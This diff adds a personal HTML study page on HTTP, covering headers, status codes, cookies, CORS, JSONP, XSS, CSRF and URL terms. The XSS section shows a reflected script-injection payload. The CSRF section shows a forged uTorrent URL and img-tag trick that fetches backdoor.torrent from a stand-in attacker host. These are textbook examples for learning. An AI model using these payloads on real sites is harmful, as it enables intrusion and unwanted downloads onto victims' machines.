@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>HTTP</title>
+  <style type="text/css">
+      code{white-space: pre-wrap;}
+      span.smallcaps{font-variant: small-caps;}
+      span.underline{text-decoration: underline;}
+      div.column{display: inline-block; vertical-align: top; width: 50%;}
+  </style>
+  <style type="text/css">
+a.sourceLine { display: inline-block; line-height: 1.25; }
+a.sourceLine { pointer-events: none; color: inherit; text-decoration: inherit; }
+a.sourceLine:empty { height: 1.2em; position: absolute; }
+.sourceCode { overflow: visible; }
+code.sourceCode { white-space: pre; position: relative; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+code.sourceCode { white-space: pre-wrap; }
+a.sourceLine { text-indent: -1em; padding-left: 1em; }
+}
+pre.numberSource a.sourceLine
+  { position: relative; }
+pre.numberSource a.sourceLine:empty
+  { position: absolute; }
+pre.numberSource a.sourceLine::before
+  { content: attr(data-line-number);
+    position: absolute; left: -5em; text-align: right; vertical-align: baseline;
+    border: none; pointer-events: all;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+    color: #aaaaaa;
+  }
+pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
+div.sourceCode
+  {  }
+@media screen {
+a.sourceLine::before { text-decoration: underline; }
+}
+code span.al { color: #ff0000; font-weight: bold; } /* Alert */
+code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
+code span.at { color: #7d9029; } /* Attribute */
+code span.bn { color: #40a070; } /* BaseN */
+code span.bu { } /* BuiltIn */
+code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
+code span.ch { color: #4070a0; } /* Char */
+code span.cn { color: #880000; } /* Constant */
+code span.co { color: #60a0b0; font-style: italic; } /* Comment */
+code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
+code span.do { color: #ba2121; font-style: italic; } /* Documentation */
+code span.dt { color: #902000; } /* DataType */
+code span.dv { color: #40a070; } /* DecVal */
+code span.er { color: #ff0000; font-weight: bold; } /* Error */
+code span.ex { } /* Extension */
+code span.fl { color: #40a070; } /* Float */
+code span.fu { color: #06287e; } /* Function */
+code span.im { } /* Import */
+code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
+code span.kw { color: #007020; font-weight: bold; } /* Keyword */
+code span.op { color: #666666; } /* Operator */
+code span.ot { color: #007020; } /* Other */
+code span.pp { color: #bc7a00; } /* Preprocessor */
+code span.sc { color: #4070a0; } /* SpecialChar */
+code span.ss { color: #bb6688; } /* SpecialString */
+code span.st { color: #4070a0; } /* String */
+code span.va { color: #19177c; } /* Variable */
+code span.vs { color: #4070a0; } /* VerbatimString */
+code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
+  </style>
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+</head>
+<body>
+<header>
+<h1 class="title">HTTP</h1>
+</header>
+<h1 id="table-of-contents">Table of Contents <span class="tag" data-tag-name="TOC_2_gh"><span class="smallcaps">TOC_2_gh</span></span></h1>
+<ul>
+<li><a href="#headers">Headers</a>
+<ul>
+<li><a href="#http-referer">HTTP referer</a></li>
+</ul></li>
+<li><a href="#response-status-codes">Response status codes</a>
+<ul>
+<li><a href="#204-no-content">204 No Content</a></li>
+<li><a href="#401-unauthorized">401 Unauthorized</a></li>
+<li><a href="#403-forbidden">403 Forbidden</a></li>
+<li><a href="#409-conflict">409 Conflict</a></li>
+</ul></li>
+<li><a href="#topics">Topics</a>
+<ul>
+<li><a href="#cache-control">Cache Control</a></li>
+<li><a href="#cookies">Cookies</a></li>
+<li><a href="#accept-vs-content-type">Accept vs. Content-Type</a></li>
+<li><a href="#when-is-the-authorization-header-automatically-sent-by-the-browser">When is the Authorization header automatically sent by the browser?</a></li>
+<li><a href="#basic-access-authentication">Basic access authentication</a></li>
+<li><a href="#web-storage-vs-cookies">Web Storage vs. Cookies</a></li>
+<li><a href="#cors-cross-origin-resource-sharing">CORS (Cross Origin Resource Sharing)</a></li>
+<li><a href="#xss-cross-site-scripting">XSS (Cross-site scripting)</a></li>
+<li><a href="#csrf-cross-site-request-forgery">CSRF (Cross-site request forgery)</a></li>
+<li><a href="#url-vs-uri-vs-urn">URL vs URI vs URN</a></li>
+<li><a href="#valid-url-characters">Valid URL characters</a></li>
+<li><a href="#endpoint">Endpoint</a></li>
+</ul></li>
+</ul>
+<h1 id="headers">Headers</h1>
+<h2 id="http-referer">HTTP referer</h2>
+<ul>
+<li>Misspelling of <strong>referrer</strong></li>
+<li>There are some tricky parts when requesting between HTTPS and HTTP (<a href="https://isc.sans.edu/forums/diary/When+does+your+browser+send+a+Referer+header+or+not/16433/">detail</a>)</li>
+</ul>
+<pre class="example"><code>Referer: https://developer.mozilla.org/en-US/docs/Web/JavaScript
+</code></pre>
+<blockquote>
+<p>when a user clicks a hyperlink in a web browser, the browser sends a request to the server holding the destination webpage. The request includes the referer field, which indicates the last page the user was on (the one where they clicked the link).</p>
+</blockquote>
+<hr />
+<ul>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer" class="uri">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer</a></li>
+<li><a href="https://en.wikipedia.org/wiki/HTTP_referer" class="uri">https://en.wikipedia.org/wiki/HTTP_referer</a></li>
+<li><a href="https://isc.sans.edu/forums/diary/When+does+your+browser+send+a+Referer+header+or+not/16433/" class="uri">https://isc.sans.edu/forums/diary/When+does+your+browser+send+a+Referer+header+or+not/16433/</a></li>
+</ul>
+<h1 id="response-status-codes">Response status codes</h1>
+<h2 id="no-content">204 No Content</h2>
+<ul>
+<li>Designates that the client <strong>doesn't need to go away from its current page.</strong></li>
+</ul>
+<hr />
+<ul>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/204" class="uri">https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/204</a></li>
+</ul>
+<h2 id="unauthorized">401 Unauthorized</h2>
+<blockquote>
+<p>“you aren’t authenticated–either not authenticated at all or authenticated incorrectly–but please reauthenticate and try again.”</p>
+</blockquote>
+<hr />
+<ul>
+<li><a href="https://stackoverflow.com/questions/3297048/403-forbidden-vs-401-unauthorized-http-responses" class="uri">https://stackoverflow.com/questions/3297048/403-forbidden-vs-401-unauthorized-http-responses</a></li>
+</ul>
+<h2 id="forbidden">403 Forbidden</h2>
+<blockquote>
+<p>“I’m sorry. I know who you are–I believe who you say you are–but you just don’t have permission to access this resource. Maybe if you ask the system administrator nicely, you’ll get permission. But please don’t bother me again until your predicament changes.”</p>
+</blockquote>
+<hr />
+<ul>
+<li><a href="https://stackoverflow.com/questions/3297048/403-forbidden-vs-401-unauthorized-http-responses" class="uri">https://stackoverflow.com/questions/3297048/403-forbidden-vs-401-unauthorized-http-responses</a></li>
+</ul>
+<h2 id="conflict">409 Conflict</h2>
+<ul>
+<li>When <code>PUT</code> request cannot be completed because of a conflict with the current state of the resource.</li>
+<li>It can be okay as a response of <code>POST</code>, but not common because <code>POST</code> request as a creation would generally cause no conflicts.</li>
+</ul>
+<hr />
+<ul>
+<li><a href="https://stackoverflow.com/questions/3825990/http-response-code-for-post-when-resource-already-exists" class="uri">https://stackoverflow.com/questions/3825990/http-response-code-for-post-when-resource-already-exists</a></li>
+</ul>
+<h1 id="topics">Topics</h1>
+<h2 id="cache-control">Cache Control</h2>
+<ul>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control" class="uri">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control</a></li>
+</ul>
+<h3 id="request">Request</h3>
+<pre class="example"><code>Cache-Control: max-age=&lt;seconds&gt;
+Cache-Control: max-stale[=&lt;seconds&gt;]
+Cache-Control: min-fresh=&lt;seconds&gt;
+Cache-Control: no-cache 
+Cache-Control: no-store
+Cache-Control: no-transform
+Cache-Control: only-if-cached
+</code></pre>
+<h3 id="response">response</h3>
+<pre class="example"><code>Cache-Control: must-revalidate
+Cache-Control: no-cache
+Cache-Control: no-store
+Cache-Control: no-transform
+Cache-Control: public
+Cache-Control: private
+Cache-Control: proxy-revalidate
+Cache-Control: max-age=&lt;seconds&gt;
+Cache-Control: s-maxage=&lt;seconds&gt;
+</code></pre>
+<h2 id="cookies">Cookies</h2>
+<ul>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies" class="uri">https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies</a></li>
+<li><a href="https://stackoverflow.com/questions/1336126/does-every-web-request-send-the-browser-cookies" class="uri">https://stackoverflow.com/questions/1336126/does-every-web-request-send-the-browser-cookies</a></li>
+</ul>
+<blockquote>
+<p>Yes, as long as the URL requested is within the same domain and path defined in the cookie (and all of the other restrictions – secure, httponly, not expired, etc) hold, then the cookie will be sent for every request.</p>
+</blockquote>
+<h3 id="set-cookie">Set-Cookie</h3>
+<pre class="example"><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
+</code></pre>
+<ul>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies" class="uri">https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies</a></li>
+<li>Secure :: The cookies that are set can only be sent over HTTPS</li>
+<li>HttpOnly :: The cookies that are set cannot be retrieved with JS. Only be sent to the designated server.</li>
+</ul>
+<h2 id="accept-vs.-content-type">Accept vs. Content-Type</h2>
+<ul>
+<li><a href="https://webmasters.stackexchange.com/questions/31212/difference-between-the-accept-and-content-type-http-headers" class="uri">https://webmasters.stackexchange.com/questions/31212/difference-between-the-accept-and-content-type-http-headers</a></li>
+</ul>
+<blockquote>
+<p><code>Accept</code> header is used by HTTP clients to tell the server what content types they'll accept. The server will then send back a response, which will include a <code>Content-Type</code> header telling the client what the content type of the returned content actually is.</p>
+</blockquote>
+<p>The <code>Content-Type</code> header on HTTP Request is for the payload of <code>POST</code> or <code>PUT</code>, which tells the server how the payload is formed.</p>
+<h2 id="when-is-the-authorization-header-automatically-sent-by-the-browser">When is the Authorization header automatically sent by the browser?</h2>
+<ul>
+<li><a href="https://stackoverflow.com/questions/15427650/when-is-the-authorization-header-automatically-sent-by-the-browser" class="uri">https://stackoverflow.com/questions/15427650/when-is-the-authorization-header-automatically-sent-by-the-browser</a></li>
+<li><a href="https://security.stackexchange.com/questions/172637/will-authorization-bearer-in-request-header-fix-csrf-attacks" class="uri">https://security.stackexchange.com/questions/172637/will-authorization-bearer-in-request-header-fix-csrf-attacks</a></li>
+</ul>
+<p>Only types like <code>Basic</code>, <code>NTLM</code> of <code>Authorization</code> header is sent automatically by browser in following cases:</p>
+<blockquote>
+<p>The <code>Authorization</code> header field allows a user agent to authenticate itself with an origin server – usually, but not necessarily, after receiving a 401 (Unauthorized) response.</p>
+</blockquote>
+<p>On the other hand, other types must explicitly be added by JS.</p>
+<blockquote>
+<p>A <code>Bearer</code> token in the <code>Authorization</code> header necessarily requires being added by JavaScript because <strong>the browser will never include it</strong></p>
+</blockquote>
+<h2 id="basic-access-authentication">Basic access authentication</h2>
+<ul>
+<li><a href="https://en.wikipedia.org/wiki/Basic_access_authentication" class="uri">https://en.wikipedia.org/wiki/Basic_access_authentication</a></li>
+</ul>
+<blockquote>
+<p>Because the BA field(<code>Authorization: Basic</code>) has to be sent in the header of <strong>each HTTP request</strong>, the web browser needs to cache credentials for a reasonable period of time to avoid constantly prompting the user for their username and password. Caching policy differs between browsers. Microsoft Internet Explorer by default caches them for 15 minutes.[1]</p>
+</blockquote>
+<h2 id="web-storage-vs.-cookies">Web Storage vs. Cookies</h2>
+<ul>
+<li><a href="https://auth0.com/docs/security/store-tokens" class="uri">https://auth0.com/docs/security/store-tokens</a></li>
+<li><a href="https://stackoverflow.com/questions/35291573/csrf-protection-with-json-web-tokens" class="uri">https://stackoverflow.com/questions/35291573/csrf-protection-with-json-web-tokens</a></li>
+</ul>
+<p>Does your authn token protect anything to do with money?</p>
+<ul>
+<li>You'll probably want the cookie httpOnly secure option.</li>
+</ul>
+<p>Is the level of effort required to implement CSRF protection not worth the assets it's protecting?</p>
+<ul>
+<li>Then the Web Storage might be the right place.</li>
+</ul>
+<h3 id="web-storage">Web Storage</h3>
+<p>There are two types of Web Storage:</p>
+<dl>
+<dt>localStorage</dt>
+<dd>data persists until explicitly deleted.
+</dd>
+<dt>sessionStorage</dt>
+<dd>Once the window is closed, the storage is deleted.
+</dd>
+</dl>
+<p>Web Storage is safe from CSRF attacks, since it doesn't automatically send its contents.</p>
+<p>However, there are some disadvantages compared to Cookies:</p>
+<ul>
+<li>sandboxed to a specific domain</li>
+<li>accessible through JS, which means that it's vulnerable to XSS attacks</li>
+</ul>
+<h3 id="cookies-1">Cookies</h3>
+<p>Disadvantages compared to Web Storages:</p>
+<ul>
+<li>4KB of max size (it counts all elements like name, value, expiry date)</li>
+<li>vulnerable to CSRF attacks</li>
+</ul>
+<h2 id="cors-cross-origin-resource-sharing">CORS (Cross Origin Resource Sharing)</h2>
+<ul>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" class="uri">https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS</a></li>
+</ul>
+<p>CORS is for invocations of the <a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest">XMLHttpRequest</a> or <a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API">Fetch API</a>, and other resources like images and fonts.</p>
+<h3 id="simple-requests">Simple Requests</h3>
+<p>With some limited conditions, CORS works as normal requests by just adding some headers like <code>Origin</code> on requests and <code>Access-Control-Allow-Origin</code> on responses. This type of requests is usually a kind of read access, like <code>GET</code>, <code>HEAD</code>, <code>POST</code></p>
+<h3 id="preflighted-requests">Preflighted Requests</h3>
+<ul>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/OPTIONS" class="uri">https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/OPTIONS</a></li>
+</ul>
+<p>If some requests is unable to comply the simple requests conditions, it should go with Preflighted Requests. With this process, the client sends an <code>OPTION</code> request first, and make the actual request using the <code>OPTION</code> response. This type of requests is usually a kind of write access, like <code>PUT</code>, <code>DELETE</code></p>
+<p>When you send an <code>OPTION</code> request, you should include some headers like <code>Access-Control-Request-Method</code>, <code>Access-Control-Request-Headers</code> Here is an example respond of the <code>OPTION</code> request.</p>
+<pre class="example"><code>Access-Control-Allow-Origin: http://foo.example
+Access-Control-Allow-Methods: POST, GET, OPTIONS
+Access-Control-Allow-Headers: X-PINGOTHER, Content-Type
+Access-Control-Max-Age: 86400
+</code></pre>
+<h3 id="xmlhttprequest.withcredentials-and-access-control-allow-credentials">XMLHttpRequest.withCredentials and Access-Control-Allow-Credentials</h3>
+<ul>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/withCredentials" class="uri">https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/withCredentials</a></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials" class="uri">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials</a></li>
+</ul>
+<p>If <code>withCredentials</code> is set to <code>true</code> on the request, the CORS request will send cookies, <code>Authorization</code> header, etc.</p>
+<p><code>Access-Control-Allow-Credentials</code>: When used as part of a response to a preflight request, this indicates whether or not the actual request can be made using credentials. If this response doesn't contain <code>Access-Control-Allow-Credentials: true</code>, it won't provide the actual response.</p>
+<p>The cookie created through this process will be treated as the third party cookie.</p>
+<h3 id="same-origin-policy">Same-origin policy</h3>
+<ul>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" class="uri">https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy</a></li>
+<li><a href="https://security.stackexchange.com/questions/8264/why-is-the-same-origin-policy-so-important" class="uri">https://security.stackexchange.com/questions/8264/why-is-the-same-origin-policy-so-important</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Same-origin_policy" class="uri">https://en.wikipedia.org/wiki/Same-origin_policy</a></li>
+</ul>
+<blockquote>
+<p>The same-origin policy is a key mechanism implemented within browsers that is designed to keep content that came from different origins from interfering with each other.</p>
+</blockquote>
+<p>Without Same-origin policy, any JS code would access other domains resources.</p>
+<p><img src="_img/screenshot_2018-03-19_01-16-27.png" /></p>
+<h3 id="jsonp">JSONP</h3>
+<div class="REFERENCES drawer">
+<ul>
+<li><a href="https://en.wikipedia.org/wiki/JSONP" class="uri">https://en.wikipedia.org/wiki/JSONP</a></li>
+</ul>
+</div>
+<p>JSON with Padding. A way to circumvent Same-origin policy before the adoption of <code>CORS</code>.</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode html"><code class="sourceCode html"><a class="sourceLine" id="cb6-1" data-line-number="1"><span class="kw">&lt;script</span><span class="ot"> type=</span><span class="st">&quot;application/javascript&quot;</span></a>
+<a class="sourceLine" id="cb6-2" data-line-number="2"><span class="ot">        src=</span><span class="st">&quot;http://server.example.com/Users/1234?callback=parseResponse&quot;</span><span class="kw">&gt;</span></a>
+<a class="sourceLine" id="cb6-3" data-line-number="3"><span class="kw">&lt;/script&gt;</span></a></code></pre></div>
+<div class="sourceCode" id="cb7" data-org-language="js"><pre class="sourceCode javascript"><code class="sourceCode javascript"><a class="sourceLine" id="cb7-1" data-line-number="1"><span class="at">parseResponse</span>(<span class="op">{</span><span class="st">&quot;Name&quot;</span><span class="op">:</span> <span class="st">&quot;Foo&quot;</span><span class="op">,</span> <span class="st">&quot;Id&quot;</span><span class="op">:</span> <span class="dv">1234</span><span class="op">,</span> <span class="st">&quot;Rank&quot;</span><span class="op">:</span> <span class="dv">7</span><span class="op">}</span>)<span class="op">;</span></a></code></pre></div>
+<h2 id="xss-cross-site-scripting">XSS (Cross-site scripting)</h2>
+<ul>
+<li><a href="https://en.wikipedia.org/wiki/Cross-site_scripting" class="uri">https://en.wikipedia.org/wiki/Cross-site_scripting</a></li>
+</ul>
+<p>An attacker observes that target website contains a reflected XSS vulnerability:</p>
+<ol>
+<li>Search feature: If no results were found, the page will display the url with the query term, like <a href="http://bobssite.org?q=term" class="uri">http://bobssite.org?q=term</a>.</li>
+<li>Submit a search query with a term like <code>&lt;script type='text/javascript'&gt;alert('xss');&lt;/script&gt;</code></li>
+<li>An alert box appears (that says <code>xss</code>).</li>
+<li>The url is <code>http://bobssite.org?q=&lt;script%20type='text/javascript'&gt;alert('xss');&lt;/script&gt;</code></li>
+<li>The attacker sends an e-mail which contains a link to the forged url.</li>
+<li>The victim gets the link and executes the attackers script.</li>
+</ol>
+<h2 id="csrf-cross-site-request-forgery">CSRF (Cross-site request forgery)</h2>
+<ul>
+<li><a href="https://en.wikipedia.org/wiki/Cross-site_request_forgery" class="uri">https://en.wikipedia.org/wiki/Cross-site_request_forgery</a></li>
+</ul>
+<p>Force a <code>.torrent</code> file download:</p>
+<ol>
+<li>uTorrent's web console is accessible at <code>localhost:8080</code></li>
+<li>Forge a url make uTorrent download <code>backdoor.torrent</code> automatically
+<ul>
+<li><code>http://localhost:8080/gui/?action=add-url&amp;s=http://evil.example.com/backdoor.torrent</code></li>
+</ul></li>
+<li>Inject the forged url as <code>&lt;img&gt;</code> tag like: <code>&lt;img src=&quot;&lt;url&gt;&quot;&gt;</code></li>
+<li>The victim opens the page containg the tag and download <code>backdoor.torrent</code> inadvertently.</li>
+</ol>
+<h2 id="url-vs-uri-vs-urn">URL vs URI vs URN</h2>
+<ul>
+<li><a href="https://stackoverflow.com/questions/176264/what-is-the-difference-between-a-uri-a-url-and-a-urn" class="uri">https://stackoverflow.com/questions/176264/what-is-the-difference-between-a-uri-a-url-and-a-urn</a></li>
+</ul>
+<table>
+<thead>
+<tr class="header">
+<th>Name (Uniform Resource -)</th>
+<th>Example</th>
+<th>Note</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><code>URI</code> (Identifier)</td>
+<td><code>https://www.google.co.kr/search?q=uri</code></td>
+<td></td>
+</tr>
+<tr class="even">
+<td><code>URL</code> (Locator)</td>
+<td><code>https://www.google.co.kr/search</code></td>
+<td>Subset of <code>URI</code>, contains only about location</td>
+</tr>
+<tr class="odd">
+<td><code>URN</code> (Name)</td>
+<td><code>urn:google:search:uri</code></td>
+<td>Subset of <code>URI</code>, doesn't necessarily tell you how to locate it on the internet. Usually Prefixed with <code>urn:</code></td>
+</tr>
+</tbody>
+</table>
+<p><img src="_img/screenshot_2017-06-03_15-46-11.png" /></p>
+<h2 id="valid-url-characters">Valid URL characters</h2>
+<p><img src="_img/screenshot_2018-05-11_12-49-59.png" /></p>
+<hr />
+<ul>
+<li><a href="https://stackoverflow.com/questions/7109143/what-characters-are-valid-in-a-url" class="uri">https://stackoverflow.com/questions/7109143/what-characters-are-valid-in-a-url</a></li>
+</ul>
+<h2 id="endpoint">Endpoint</h2>
+<ul>
+<li><a href="https://stackoverflow.com/questions/9807382/what-is-a-web-service-endpoint" class="uri">https://stackoverflow.com/questions/9807382/what-is-a-web-service-endpoint</a></li>
+<li>A web <code>endpoint</code> is <code>URL</code> that another program would use to communicate with your program.</li>
+</ul>
+</body>
+</html>
